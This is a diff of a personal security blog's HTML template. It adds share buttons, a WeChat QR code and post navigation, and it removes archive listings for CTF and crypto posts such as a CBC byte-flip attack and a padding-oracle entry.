+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -189,107 +256,108 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http:www.xnianq.cn/2017/11/19/l-ctf-simpleblog-wp/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-title">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/07/28/cbc字节翻转攻击/" class="archive-article-date">
-  	<time datetime="2017-07-28T08:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-28</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2017/11/08/手动利用无回显报错注入/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">手动利用无回显报错注入</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/07/28/cbc字节翻转攻击/">cbc字节翻转攻击</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">crypto</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-title">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/07/26/padding-oracle/" class="archive-article-date">
-  	<time datetime="2017-07-26T09:56:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/07/26/padding-oracle/">padding-oracle</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">crypto</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -312,8 +380,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
